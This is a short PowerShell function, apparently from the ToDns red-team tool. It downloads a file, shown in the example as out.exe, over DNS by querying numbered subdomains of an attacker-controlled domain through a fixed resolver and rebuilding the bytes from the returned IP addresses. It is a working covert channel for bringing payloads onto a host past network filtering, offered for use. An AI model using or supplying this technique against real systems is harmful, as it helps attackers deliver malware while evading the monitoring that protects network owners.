Function DownloadOverDNS {
<#
.SYNOPSIS
Function to download a file through DNS

.DESCRIPTION
Will made A requests for <id>.d.<domain> until the dn server returned an error. The base64 payload will be decoded and wrote to a file.

.PARAMETER Domain
The domain where the todns script listen to be able to answer the requests.

.PARAMETER OutputFilename
Filename to write the base64 decoded data.

.EXAMPLE
PS > DownloadOverDNS -Domain todns.nodauf.ovh -OutputFilename out.exe

.LINK
https://github.com/nodauf/ToDns
#>
    param(
        [Parameter(Mandatory=$true)]$Domain,
        [Parameter(Mandatory=$true)]$OutputFilename
    )
    $finish = $false
    $i = 0
    $dataDecimal = [uint16[]] @()
    do {
        try{
            $dataDecimal += (Resolve-DnsName "$i.d.$Domain" -Type A  -ErrorAction Stop -Server ha10.scrt.ch).IPAddress.Split("\n").Split(".")
            Write-Host "Download chunk $i at $i.d.$Domain"
            $i++
        }catch{
            $finish = $true
        }
    } while (!$finish)
    $decoded = [Byte[]] ([uint16[]] $dataDecimal)

   Set-Content $OutputFilename -Value $decoded -Encoding Byte
}